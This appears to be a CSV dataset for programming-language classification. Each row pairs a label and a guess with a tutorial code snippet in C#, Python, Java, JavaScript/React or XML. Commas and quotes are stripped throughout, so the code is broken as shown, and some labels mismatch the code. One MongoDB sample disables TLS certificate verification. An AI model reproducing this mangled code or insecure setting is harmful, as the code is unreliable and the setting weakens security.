correct,guess,snippet
C++,c++,"  // initializes a vector that holds the numbers from 0-9.  std::vector<int> v = { 0 1 2 3 4 5 6 7 8 9 };  print(v);   // removes all elements with the value 5  v.erase( my::unstable_remove( v.begin() v.end() 5 ) v.end() );   print(v);  // removes all odd numbers  v.erase( my::unstable_remove_if(v.begin() v.end() is_odd) v.end() );  print(v);"
Python,python,"class Meta(type):    @property    def RO(self):        return 13class DefinitionSet(Meta(str() () {})):    greetings = Hello!    myNameFormat = My name is {}.    durationSeconds = 3.5    color = { opacity: 0.7 wavelength: 400 }    @property    def RO(self):        return 14    def __init__(self):        self.greetings = Hello again!        self.myNameFormat = Let me introduce myself. My name is {}.        self.durationSeconds = 3.6        self.color = { opacity: 0.8 wavelength: 410 }instance = DefinitionSet()# instance.RO and DefinitionSet.RO are two different# read-only attributes"
Python,python,"# using instance attributes:class DefinitionSet:    def __init__(self):        self.greetings = Hello!        self.myNameFormat = My name is {}.        self.durationSeconds = 3.5        self.color = { opacity: 0.7 wavelength: 400 }definitionSet = DefinitionSet()#...print (definitionSet.durationSeconds)"
Python,python,"class Foo(ReadonlyBase):    bar = 100    test = Readonly.Attribute(13)print(Foo.bar:  + str(Foo.bar))Foo.bar += 1print(Modified Foo.bar:  + str(Foo.bar))print(Foo.test:  + str(Foo.test))try:    Foo.test = Foo.test + 1 # will raise exceptionexcept Exception:    print (Cannot set attribute Foo.test)"
Python,python,"class Readonly(type):    class Attribute(object):        def __init__(self value):            self.value = value        def __new__(metaclass classname bases classdict):        class NewMetaclass(metaclass):            attributeContainer = {}        def getAttrFromMetaclass(attr):            return lambda cls: type(cls).attributeContainer[attr]        clone = dict(classdict)        for name value in clone.items():            if not isinstance(value metaclass.Attribute):                continue;            getattr(NewMetaclass DefinitionSet.attributeContainerName)[name] = value.value            aProperty = property(getAttrFromMetaclass(name))            setattr(NewMetaclass name aProperty)            classdict[name] = aProperty            classdict.pop(name None)                       return type.__new__(NewMetaclass classname bases classdict)"
Python,python,"class DefinitionSet:    attributeContainerName = .class Readonly(type):    class Attribute(object):        def __init__(self value):            self.value = value    @classmethod    def Base(cls): # base class with access control of class attribute        return Readonly(str() () {})        def __new__(metaclass className bases classDictionary):        def getAttrFromClass(attr):            return lambda cls: getattr(type(cls) DefinitionSet.attributeContainerName)[attr]        class NewMetaclass(metaclass):            setattr(metaclass DefinitionSet.attributeContainerName {})            def __call__(cls *args **kwargs):                instance = type.__call__(cls *args **kwargs)                newClass = metaclass(cls.__name__ cls.__bases__ {})                newInstance = type.__call__(newClass)                setattr(newClass DefinitionSet.attributeContainerName {})                names = dir(instance)                for name in names:                    if hasattr(cls name):                        continue                    value = getattr(instance name)                    if isinstance(value metaclass.Attribute):                        if hasattr(newInstance name):                            delattr(newInstance name)                        getattr(                            newClass                            DefinitionSet.attributeContainerName)[name] = value.value                        aProperty = property(getAttrFromClass(name))                        setattr(newClass name aProperty)                    else:                        setattr(newInstance name getattr(instance name))                return newInstance        clone = dict(classDictionary)        for name value in clone.items():            if not isinstance(value metaclass.Attribute):                continue;            getattr(NewMetaclass DefinitionSet.attributeContainerName)[name] = value.value            aProperty = property(getAttrFromClass(name))            setattr(NewMetaclass name aProperty)            classDictionary[name] = aProperty            classDictionary.pop(name None)                       return type.__new__(NewMetaclass className bases classDictionary)"
C++,c++,"#include <iostream>#include <string>#include <algorithm>#include <vector>// TriviallyCopyable structurestruct MyStruct{    int n;    double d;};struct MyStruct2{    int n;    double d;    std::string s;};int main(){    std::vector<MyStruct> v1{ {1 1.0} {2 2.0} };    std::vector<MyStruct> v2{ 2 };    std::copy(v1.begin() v1.end() v2.begin()); // calls memmove()    for (const auto& o : v2)    {        std::cout << After v2 copy n: << o.n <<  d: << o.d << std::endl;    }    std::vector<MyStruct2> v3{ { 1 1.0 Hello }{ 2 2.0 World } };    std::vector<MyStruct2> v4{ 2 };    std::copy(v3.begin() v3.end() v4.begin()); // Does not call memmove()    for (const auto& o : v4)    {        std::cout << After v4 copy n: << o.n <<  d: << o.d <<  s: << o.s << std::endl;    }    return 0;}"
C#,c#,"public class MainPageViewModel : ViewModel{    private IStorageFile selectedMediaFile;    public IStorageFile SelectedMediaFile    {        get { return selectedMediaFile; }        private set        {            if (selectedMediaFile != value)            {                selectedMediaFile = value;                RaisePropertyChanged();            }        }    }}"
C#,c#,"public class SetMediaSourceBehavior : Behavior<MediaPlayerElement>{    public StorageFile SourceFile    {        get { return (StorageFile)GetValue(SourceFileProperty); }        set { SetValue(SourceFileProperty value); }    }    public static readonly DependencyProperty SourceFileProperty =        DependencyProperty.Register(SourceFile typeof(StorageFile)             typeof(SetMediaSourceBehavior) new PropertyMetadata(null OnSourceFileChanged));    private static void OnSourceFileChanged(DependencyObject d DependencyPropertyChangedEventArgs e)    {        if (d is SetMediaSourceBehavior setMediaSourceBehavior)            setMediaSourceBehavior.UpdateSource(e.NewValue as IStorageFile);            }    private void UpdateSource(IStorageFile storageFile)    {        AssociatedObject.Source = null;        if (storageFile != null)        {            var mediaSource = MediaSource.CreateFromStorageFile(storageFile);            AssociatedObject.Source = mediaSource;        }    }}"
XML,xml,"<MediaPlayerElement Width=640 Height=480>    <i:Interaction.Behaviors>        <behaviors:SetMediaSourceBehavior SourceFile={Binding SelectedMediaFile} />    </i:Interaction.Behaviors></MediaPlayerElement>"
C#,c#,"public interface IMediaPlayerAdapter{    /// <summary>    /// Gets the information whether a MediaPlayer is injected into adapter    /// </summary>    bool MediaPlayerAdapted { get; }    /// <summary>    /// Informs ViewModel whenever a MediaPlayer is injected into adapter    /// </summary>    event EventHandler MediaPlayerAdaptedChanged;            TimeSpan Position { get; }            IObservable<TimeSpan> WhenPositionChanges { get; }    double PlaybackRate { get; }    IObservable<double> WhenPlaybackRateChanges { get; }    //Using RX - IObservable to notify about state changes    //Alternative approach would be to use plain events    //event EventHandler PositionChanged;    void Play();    void Pause();        }"
C#,c#,"public class InjectMediaPlayerBehavior : Behavior<MediaPlayerElement>{    public IMediaPlayerAdapterInjector MediaPlayerInjector    {        get { return (IMediaPlayerAdapterInjector)GetValue(MediaPlayerInjectorProperty); }        set { SetValue(MediaPlayerInjectorProperty value); }    }    public static readonly DependencyProperty MediaPlayerInjectorProperty =        DependencyProperty.Register(MediaPlayerInjector typeof(IMediaPlayerAdapterInjector)         typeof(InjectMediaPlayerBehavior) new PropertyMetadata(null OnMediaPlayerInjectorChanged));    private static void OnMediaPlayerInjectorChanged(DependencyObject d                                       DependencyPropertyChangedEventArgs e)    {        var injectMediaPlayerBehavior = d as InjectMediaPlayerBehavior;        if (injectMediaPlayerBehavior != null)            injectMediaPlayerBehavior.TryToInjectMediaPlayer();    }    public MediaPlayer MediaPlayer    {        get { return (MediaPlayer)GetValue(MediaPlayerProperty); }        set { SetValue(MediaPlayerProperty value); }    }    public static readonly DependencyProperty MediaPlayerProperty =        DependencyProperty.Register(MediaPlayer typeof(MediaPlayer)           typeof(InjectMediaPlayerBehavior) new PropertyMetadata(null OnMediaPlayerChanged));    private static void OnMediaPlayerChanged(DependencyObject d DependencyPropertyChangedEventArgs e)    {        var injectMediaPlayerBehavior = d as InjectMediaPlayerBehavior;        if (injectMediaPlayerBehavior != null)            injectMediaPlayerBehavior.TryToInjectMediaPlayer();    }        protected override void OnAttached()    {        base.OnAttached();        if (ReadLocalValue(MediaPlayerProperty) == DependencyProperty.UnsetValue)            SetBindingOnLocalMediaPlayer();    }    private void SetBindingOnLocalMediaPlayer()    {        Binding mediaPlayerBinding = new Binding        {            Source = AssociatedObject            Mode = BindingMode.OneWay            Path = new PropertyPath(nameof(AssociatedObject.MediaPlayer))        };        BindingOperations.SetBinding(this InjectMediaPlayerBehavior.MediaPlayerProperty                 mediaPlayerBinding);    }    private void TryToInjectMediaPlayer()    {        MediaPlayerInjector?.Adapt(MediaPlayer);    }}"
XML,xml,"<MediaPlayerElement Width=640 Height=480>    <i:Interaction.Behaviors>        <behaviors:SetMediaSourceBehavior SourceFile={Binding SelectedMediaFile} />        <behaviors:InjectMediaPlayerBehavior MediaPlayerInjector={Binding MediaPlayerAdapter}/>    </i:Interaction.Behaviors></MediaPlayerElement>"
C#,c#,"public class MediaPlayerViewModel : ViewModel{    private readonly IMediaPlayerAdapter mediaPlayerAdapter;    public MediaPlayerViewModel(IMediaPlayerAdapter mediaPlayerAdapter)    {        this.mediaPlayerAdapter = mediaPlayerAdapter;    }    public IMediaPlayerAdapter MediaPlayerAdapter    {        get { return mediaPlayerAdapter; }    }}"
C#,c#,"// get default implementation of IPerson// interface containing only propertys// the default property implementation// is the auto propertyIPerson person = Core.Concretize<IPerson>();person.FirstName = Joe;person.LastName = Doe;person.Age = 35;person.Profession = Astronaut;// test that the properties have indeed been assigned. Console.WriteLine($Name='{person.FirstName} {person.LastName}';                   Age='{person.Age}'; Profession='{person.Profession}'); "
C#,c#,"public class Person_Concretization : NoClass IPerson NoInterface{    public static Core TheCore { get; set; }    #region Default Constructor    public Person_Concretization ()    {    }    #endregion Default Constructor    #region Generated Properties    public string FirstName    {        get;        set;    }    public string LastName    {        get;        set;    }    public int Age    {        get;        set;    }    public string Profession    {        get;        set;    }    #endregion Generated Properties}"
C#,c#,"public class PersonImpl{    public string FirstName { get; set; }    private string LastName { get; set; }    private int Age { get; set; }    private string TheProfession { get; set; }    private string GetFullNameAndProfession()    {        return ${FirstName} {LastName} - {TheProfession};    }}  "
C#,c#,"#region create the generated type configuration object// get the type configuration object. The class that it is going to generate// will be called MyPersonImplementationITypeConfig typeConfig =    Core.FindOrCreateTypeConfig<IPerson PersonImplementationWrapperInterface>(MyPersonImplementation);// allow access to non-public members of // PersonImplementationWrapperInterface.ThePersonImplementation object.typeConfig.SetAllowNonPublicForAllMembers(nameof(PersonImplementationWrapperInterface.ThePersonImplementation));// map TheProfession property of the wrapped object// into Profession property of the IPerson interface.typeConfig.SetMemberMap(    nameof(PersonImplementationWrapperInterface.ThePersonImplementation)    TheProfession    nameof(IPerson.Profession));// Signal that the configuration is completed // after ConfigurationCompleted() method is called// TypeConfig object for this class cannot be modified.typeConfig.ConfigurationCompleted();#endregion create the generated type configuration object// get the instance of the generated type MyPersonImplementationIPerson person =     Core.GetInstanceOfGeneratedType<IPerson>(MyPersonImplementation);// set the propertiesperson.FirstName = Joe;person.LastName = Doe;person.Age = 35;person.Profession = Astronaut;// test that the wrapped properties and the method workConsole.WriteLine($Name/Profession='{person.GetFullNameAndProfession()}'; Age='{person.Age}');"
C#,c#,"// we create an adaptor adapting ProductKind enumeration// to IProduct interface using extension methods from the static // ProductKindExtensions classCore.CreateEnumerationAdapter<IProduct ProductKind>(typeof(ProductKindExtensions));// enumeration value ProductKind.FinancialInstrument is converted into// IProduct interfaceIProduct product =    Core.CreateEnumWrapper<IProduct ProductKind>(ProductKind.FinancialInstrument);// we test the methods of the resulting object that implements IProduct interface.Console.WriteLine($product: {product.GetDisplayName()}; Description: {product.GetDescription()});"
React,xml,"        render()        {            return (                <div>                    <h1>Car Selection</h1>                    <ListBox Items={this.state.carMakes}                             valuePropertyName='id'                             selectedValue={this.state.selectedMake}                             placeholder='Please select a make...'                             textPropertyName='name'                             OnSelect={this.OnCarMakeSelect} />                    <ListBox Items={this.state.carModels}                             selectedValue={this.state.selectedModel}                             placeholder='Please select a model...'                             OnSelect={this.OnCarModelSelect} />                 </div>            );        }"
React,react,"        class ListBox extends React.Component        {            render()             {                return (                    <div className=listBox>                        <select onChange={this.OnChange.bind(this)} ref='listBox'>                            <option value=-1 disabled selected hidden>{this.props.placeholder}</option>                            {this.props.Items.map((item i) =>                             <ListBoxItem Item={{ 'Text': item[this.textPropertyName]                             'Value': item[this.valuePropertyName] }} />)}                        </select>                    </div>                );             }        }"
React,react,"        class ListBoxItem extends React.Component        {            render()             {                return (                        <option key={this.props.Item.Value}                         value={this.props.Item.Value}>{this.props.Item.Text}</option>                );            }        }"
XML,xml,"        <ListBox Items={this.state.carMakes}                 valuePropertyName='id'                 selectedValue={this.state.selectedMake}                 placeholder='Please select a make...'                 textPropertyName='name'                 OnSelect={this.OnCarMakeSelect} />        <ListBox Items={this.state.carModels}                 selectedValue={this.state.selectedModel}                 placeholder='Please select a model...'                 OnSelect={this.OnCarModelSelect} />"
JavaScript,javascript,"        OnCarMakeSelect(value text)        {            this.setState({ selectedMake: value carModels: GetCarModels(value) selectedModel: -1 });        }        OnCarModelSelect(value text)        {            this.setState({ selectedModel: value });        }"
JavaScript,javascript,"        componentDidUpdate(nextProps nextState)        {            var select = this.refs.listBox;            if (select)            {                select.value = this.props.selectedValue;                this.props.OnSelect(select.value);            }        }"
C#,c#,"private void Tokenize(string expression) {    // place to accumulate digits    string number = ;    // loop by char through code    foreach (char c in expression) {        // operators can end tokens as well as being one        if (IsOperator(c.ToString()) ||            ().Contains(c.ToString())) {            if (number != ) {                Tokens.Add(number);                number = ;            }            Tokens.Add(c.ToString());        }        // spaces end numbers        else if (c == ' ') {            if (number != ) {                Tokens.Add(number);                number = ;            }        }        // digits can combine so store each one        else if (0123456789.Contains(c.ToString())) {            number += c;        }        else {                // barf if you encounter something not a digit                // space or operator                throw new ParseException(                    Unexpected character ' + c.ToString() + '.);        }    }    // add the last token if there is one    if (number != ) {        Tokens.Add(number);    }    return;}"
C#,c#," private void Parse() {      foreach (string token in Tokens) {          if (IsOperator(token)) {              PopOperators(token);              OperatorStack.Push(token);          }          else if (token == () {              // parens only go on stack temporarily               // as they're not ops              OperatorStack.Push(token);          }          else if (token == )) {              while (OperatorStack.Peek() != () {                  Postfix.Add(OperatorStack.Pop());              }              OperatorStack.Pop();          }          else if (int.TryParse(token out int throwaway)) {              Postfix.Add(token);          }          else {              throw new ParseException(                  Unrecognized token:  + token + .);          }      }      while (OperatorStack.Count > 0) {          Postfix.Add(OperatorStack.Pop());      }  }"
C#,c#,"private static bool GreaterPrecedence(Operator a Operator b) {    return (a.Precedence > b.Precedence) ||        ((a.Precedence == b.Precedence) &&         (b.Associativity == Associativities.Left));}private void PopOperators(string token) {    Operator cur = OperatorFromString(token);    // if there are no operators get out    if (OperatorStack.Count == 0) {        return;    }    try {        for (Operator top = OperatorFromString(OperatorStack.Peek());             (OperatorStack.Count > 0 && GreaterPrecedence(top cur));             top = OperatorFromString(OperatorStack.Peek())) {            Postfix.Add(OperatorStack.Pop());        }    }    catch (ParseException) {        // it's a parenthesis which can't be parsed as an operator        return;    }}"
JavaScript,c#,"// create everything needed to start writing CILAppDomain domain = AppDomain.CurrentDomain;AssemblyName name = new AssemblyName();name.Name = CalculatorExpression;// make a run-only assembly (can't save as .exe)AssemblyBuilder asm = domain.DefineDynamicAssembly(    name AssemblyBuilderAccess.Run);"
C#,c#,"            …            default:                throw new CompileException(                    Unknown operator: ' + token + '.);        }    }    else {        // if the token's not an integer or an operator         // barf appropriately        if (().Contains(token)) {            throw new CompileException(Unbalanced parentheses.);        }        else {            throw new CompileException(                Unable to compile expression; unknown token ' +                token + '.);        }    }}"
C#,c#,"class MainClass {    private static string PromptExpression() {        Console.WriteLine(Enter an integer arithmetic expression: );        return Console.ReadLine();    }    public static void Main(string[] args) {        try {            string expr;            while ((expr = PromptExpression()) != ) {                Program program = new Program(expr);                program.Execute();            }        }        catch (NullReferenceException) {            // stdin EOF            return;        }        catch (ParseException e) {            Console.WriteLine(                Unparseable expression:  + e.Message);        }        catch (CompileException e) {            Console.WriteLine(                Unable to compile expression:  + e.Message);        }    }}"
C#,c#,"using System;using System.Collections.Generic;using System.Linq;using System.Threading;using System.Threading.Tasks;using System.Web;namespace GordonBeeming.ApiHelpers{    public static class AsyncHelpers    {        /// <summary>        /// Execute's an async Task<T> method which has a void return value synchronously        /// </summary>        /// <param name=task>Task<T> method to execute</param>        public static void RunSync(Func<Task> task)        {            var oldContext = SynchronizationContext.Current;            var synch = new ExclusiveSynchronizationContext();            SynchronizationContext.SetSynchronizationContext(synch);            synch.Post(async _ =>            {                try                {                    await task();                }                catch (Exception e)                {                    synch.InnerException = e;                    throw;                }                finally                {                    synch.EndMessageLoop();                }            } null);            synch.BeginMessageLoop();            SynchronizationContext.SetSynchronizationContext(oldContext);        }        /// <summary>        /// Execute's an async Task<T> method which has a T return type synchronously        /// </summary>        /// <typeparam name=T>Return Type</typeparam>        /// <param name=task>Task<T> method to execute</param>        /// <returns></returns>        public static T RunSync<T>(Func<Task<T>> task)        {            var oldContext = SynchronizationContext.Current;            var synch = new ExclusiveSynchronizationContext();            SynchronizationContext.SetSynchronizationContext(synch);            T ret = default(T);            synch.Post(async _ =>            {                try                {                    ret = await task();                }                catch (Exception e)                {                    synch.InnerException = e;                    throw;                }                finally                {                    synch.EndMessageLoop();                }            } null);            synch.BeginMessageLoop();            SynchronizationContext.SetSynchronizationContext(oldContext);            return ret;        }        private class ExclusiveSynchronizationContext : SynchronizationContext        {            private bool done;            public Exception InnerException { get; set; }            readonly AutoResetEvent workItemsWaiting = new AutoResetEvent(false);            readonly Queue<Tuple<SendOrPostCallback object>> items =                new Queue<Tuple<SendOrPostCallback object>>();            public override void Send(SendOrPostCallback d object state)            {                throw new NotSupportedException(We cannot send to our same thread);            }            public override void Post(SendOrPostCallback d object state)            {                lock (items)                {                    items.Enqueue(Tuple.Create(d state));                }                workItemsWaiting.Set();            }            public void EndMessageLoop()            {                Post(_ => done = true null);            }            public void BeginMessageLoop()            {                while (!done)                {                    Tuple<SendOrPostCallback object> task = null;                    lock (items)                    {                        if (items.Count > 0)                        {                            task = items.Dequeue();                        }                    }                    if (task != null)                    {                        task.Item1(task.Item2);                        if (InnerException != null) // the method threw an exception                        {                            throw new AggregateException                            (AsyncHelpers.Run method threw an exception. InnerException);                        }                    }                    else                    {                        workItemsWaiting.WaitOne();                    }                }            }            public override SynchronizationContext CreateCopy()            {                return this;            }        }    }}"
C#,c#,"using nologo.Chassis.Part.Identity;using nologo.Common.Core;using System;using System.Linq;using System.Net.Http;using System.Threading.Tasks;using System.Web.Http.Controllers;using System.Web.Mvc;namespace GordonBeeming.Attributes{    public class AuthorizeAsyncAttribute : AuthorizeAttribute    {        public override void OnAuthorization(AuthorizationContext filterContext)        {            AsyncHelpers.RunSync(() => OnAuthorizationAsync(filterContext));        }        public async Task OnAuthorizationAsync(AuthorizationContext filterContext)        {            var profile = await ProfileHelper.GetFromApi();                        // do something with profile        }        public int AllowedRole { get; set; }        public int[] AllowedRoles { get; set; }    }}"
C#,c#,"[Flags]public enum PizzaToppings{    None = 0    Mozzarella = 1    Pepperoni = 2    Anchovies = 4    Mushrooms = 8    Corn = 16}//...PizzaToppings myFavs = PizzaToppings.Pepperoni | PizzaToppings.Anchovies;Console.WriteLine(myFavs);"
C#,c#,"string s1 = &quot;Anchovies&quot;;string s2 = &quot;AnCHOviES&quot;;PizzaToppings pt1 = (PizzaToppings)Enum.Parse(typeof(PizzaToppings) s1);PizzaToppings pt2 = (PizzaToppings)Enum.Parse(typeof(PizzaToppings) s2 ignoreCase: true);PizzaToppings pt3 = (PizzaToppings)Enum.Parse(typeof(PizzaToppings) s2); // ArgumentException -                                                 // by default the parsing does not ignore casing"
C#,c#,"switch(month) {    case Month.January :         Console.WriteLine(&quot;Cold brrr....&quot;);         break;    case Month.February :         Console.WriteLine(&quot;Still cold brrr....&quot;);         break;// ...}"
Java,java,"public class Mood {    private Mood() {        throw new IllegalOperationException(); // prevent accidental instantiation even within the class    }    public static final int HAPPY = 0;    public static final int BORED = 1;    public static final int SAD = 2;    public static final int ANGRY = 3;    public static final int ECSTATIC = 4;    public static final int SLEEPY = 5;}"
Java,java,"public enum Planet {    MERCURY (3.303e+23 2.4397e6)    VENUS   (4.869e+24 6.0518e6)    EARTH   (5.976e+24 6.37814e6)    MARS    (6.421e+23 3.3972e6)    JUPITER (1.9e+27   7.1492e7)    SATURN  (5.688e+26 6.0268e7)    URANUS  (8.686e+25 2.5559e7)    NEPTUNE (1.024e+26 2.4746e7)    PLUTO   (1.27e+22  1.137e6);    private final double mass;   // in kilograms    private final double radius; // in meters    Planet(double mass double radius) {        this.mass = mass;        this.radius = radius;    }    public double mass()   { return mass; }    public double radius() { return radius; }    // universal gravitational constant  (m3 kg-1 s-2)    public static final double G = 6.67300E-11;    public double surfaceGravity() {        return G * mass / (radius * radius);    }    public double surfaceWeight(double otherMass) {        return otherMass * surfaceGravity();    }}"
Java,java,"// at member levelpublic enum Chores implements Runnable {    TAKE_OUT_THE_TRASH {        @Override        public void run() { // ...        }    }    DO_THE_LAUNDRY {        @Override        public void run() { // ...        }    }}public enum FunStuff implements Runnable {    GO_OUT    VISIT_NEW_PLACES    // ...    @Override    public void run() { // ...    }}"
JavaScript,javascript,"// Karma configuration file see link for more information// https://karma-runner.github.io/1.0/config/configuration-file.htmlmodule.exports = function (config) {  config.set({    basePath: ''    frameworks: ['jasmine' '@angular/cli']    plugins: [      require('karma-jasmine')      require('karma-chrome-launcher')      require('karma-jasmine-html-reporter')      require('karma-coverage-istanbul-reporter')      require('@angular/cli/plugins/karma')    ]    client:{      clearContext: false // leave Jasmine Spec Runner output visible in browser    }    coverageIstanbulReporter: {      reports: [ 'html' 'lcovonly' ]      fixWebpackSourcePaths: true    }    angularCli: {      environment: 'dev'    }    reporters: ['progress' 'kjhtml']    port: 9876    colors: true    logLevel: config.LOG_INFO    autoWatch: true    browsers: ['Chrome']    singleRun: false  });};"
JavaScript,javascript," beforeEach(() => {    fixture = TestBed.createComponent(SignupComponent);    component = fixture.componentInstance;        /*Debug element */    de = fixture.debugElement.query(By.css('h1'));    /* H1 element */    el = de.nativeElement;       fixture.detectChanges();  });"
JavaScript,javascript,"it('should have a title' () => {expect(el).toBeTruthy();});it('should display original title' () => {  fixture.detectChanges();  expect(el.textContent).toContain(comp.title);});it('should display a different test title' () => {  comp.title = 'Test Title';  fixture.detectChanges();  expect(el.textContent).toContain('Test Title');});"
C#,c#,"const string connectionString =mongodb://ScramUser:ScramUserPwd@localhost;var client = new MongoClient(connectionString);IMongoDatabase database = client.GetDatabase(TestMongoDB);IMongoCollection<clubmember> collection = database.GetCollection<clubmember>(CarClub); long count = collection.Count(new BsonDocument());"
C#,c#,"  const string connectionString = mongodb://localhost;  //For a server running on a domain named GEORGE-DELL and port 27025 use  //const string connectionString = mongodb://GEORGE-DELL:27025;     var clientSettings = MongoClientSettings.FromUrl(new MongoUrl(connectionString));         clientSettings.SslSettings = new SslSettings();         clientSettings.UseSsl = true;         clientSettings.SslSettings.ClientCertificates = new List<x509certificate>()          {       		 new X509Certificate2(@C:\MongoDB\SSL\x509User.pfx x509UserPwd)           };            clientSettings.Credentials = new[]            {                MongoCredential.CreateMongoX509Credential(              C=GBST=NPTL=LondonO=x509UserOU=ITCN=George-HPemailAddress=myemail@myemail.com)            };            clientSettings.SslSettings.EnabledSslProtocols = SslProtocols.Tls12;            clientSettings.SslSettings.CheckCertificateRevocation = false;            clientSettings.VerifySslCertificate = false;        var client = new MongoClient(clientSettings); "
Java,c#,"PacketProcessor.onAcStatusChange.add(new IPacketChange() {  @Override  public void notifyAlert(PacketV3 packet) {    sendSMS(packetac);    sendEmail(packetac);  }});PacketProcessor.onEngineStatusChange.add(new IPacketChange() {  @Override  public void notifyAlert(PacketV3 packet) {    sendSMS(packetengine);    sendEmail(packetengine);  }});"
Python,python,"from flask import Blueprint request jsonifyfrom redisworks import Rootroot = Rootroot.todo_list = {item1: This is a nice day item2: Python is awesome}todo_api = Blueprint('todo' 'todo' url_prefix='/todos')@todo_api.route('/' methods=['GET'])def api_list():    items = root.todo_list    return jsonify(items)@todo_api.route('/<item_id>' methods=['GET' 'DELETE' 'PUT'])def api_item(item_id):    if request.method == 'GET':        return get_item(item_id)    elif request.method == 'PUT':        return put_item(item_id)    else:        delete_item(item_id)def get_item(item_id):    return root.todo_list[item_id]def put_item(item_id):    item = request.data    root.todo_list[item_id] = item.decode('utf-8')    return item 201def delete_item(item_id):    root.todo_list.__delitem__(item_id)"
C#,c#,"int totalRecords = FileManager.GetTotalRecords();List<Context> allContext = new List<Context>();for(int i = 0; i< totalRecords; i++ ){    // Create a related object for each class..    allContext.Add(new Context(i));}"
C#,c#,"try{     for (int i = 0; i < 200; i++)     {         // new keyword under the loop         aChunkOfData = new byte[104857600];         dataBytes.Add(aChunkOfData);     }}catch (System.OutOfMemoryException excep){  Console.WriteLine(Out of Memory Exception Occurs.. Now preventing the resourcess);}"
C#,c#,"public class Program{static void Main(String[] args){    byte[] globalData = new byte[1000];   // call the function    DoTheWork();    for(int i=0; i<globalData.length;i++)    {        byte aByte =(byte) (globalData[i]+1);        SendData(aByte);            }}public static void DoTheWork(){    byte[] data  = new byte[100];        // work on data..    for(int i =0; i<data.length;i++)    {        byte aByte =(byte) (data[i]+1);        SendData(aByte);    }}}"
C#,c#,"            List<byte[]> dataBytes = new List<byte[]>();           byte[] aChunkOfData = new byte[104857600]; //100MB                    Thread.Sleep(5000);                          for (int i = 0; i < 20; i++)               {                  // Create Memory Resources                   aChunkOfData = new byte[104857600];                   dataBytes.Add(aChunkOfData);               }                    // 5 seconds delay to show up on the graph           Thread.Sleep(5000);           for (int i = 0; i < 20; i++)           {               aChunkOfData = new byte[104857600];               dataBytes.Add(aChunkOfData);           }           Thread.Sleep(5000);           for (int i = 0; i < 40; i++)           {               aChunkOfData = new byte[104857600];               dataBytes.Add(aChunkOfData);           }"
C#,c#," bool UserExited = false;int chunkSize=1024;IPAddress ipAddress = new System.Net.IPAddress(new byte[]{127001});int portAddress = 1060;TcpClient client = new TcpClient(new IPEndPoint(ipAddressportAddress));client.Connect(new IPEndPoint(ipAddress portAddress));NetworkStream stream=  client.GetStream();while (!UserExited){if(client.Available>0){byte[] buffer = new byte[chunkSize];stream.Read(buffer0chunkSize);// transmit buffer..stream.Close();"
HTML,html,"<!DOCTYPE html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en><head>  <meta charset=UTF-8 />  <title>CRUD Operations with IndexedDB - Part 1</title>  <!-- Load the IndexedDB Promised library (see https://github.com/jakearchibald/idb) -->  <script src=lib/idb.js></script>  <script>    var IDB = {      dbName: testDB      //------------------------------------------------      <strong>createEmptyDB</strong>: function ( tableNames) {      //------------------------------------------------        return new Promise( function (resolve) {          <strong>idb.open</strong>( IDB.dbName 1 function (upgradeDb) {            tableNames.forEach( function (tableName) {              if (!upgradeDb.objectStoreNames.contains( tableName)) {                upgradeDb.createObjectStore( tableName {<strong>keyPath</strong>:id});              }            })          }).then( resolve);        });      }"
JavaScript,javascript,"      //------------------------------------------------      <strong>add</strong>: function ( tableName records) {      //------------------------------------------------        return new Promise( function (resolve reject) {          idb.open( IDB.dbName).then( function (idbCx) {  // idbCx is a DB connection            var tx = idbCx.transaction( tableName readwrite);            var os = tx.objectStore( tableName);            // Promise.all takes a list of promises and resolves if all of them do            return Promise.all( records.map( rec => {return <strong>os.add</strong>( rec);}))                .then( function () {return tx.complete;});          }).then( resolve)          .catch( function (err) {            reject( err);          });        });      }"
JavaScript,javascript,"      //------------------------------------------------      <strong>clearDB</strong>: function () {      //------------------------------------------------        return new Promise( function (resolve) {          idb.open( IDB.dbName).then( function (idbCx) {  // idbCx is a DB connection            var tx = idbCx.transaction( idbCx.objectStoreNames readwrite);            // Promise.all takes a list of promises and resolves if all of them do            return Promise.all( Array.from( idbCx.objectStoreNames                osName => {return tx.objectStore( osName).<strong>clear</strong>();}))                .then( function () {return tx.complete;});          }).catch( function (err) {            console.log( err);          }).then( resolve);        });      }    }"
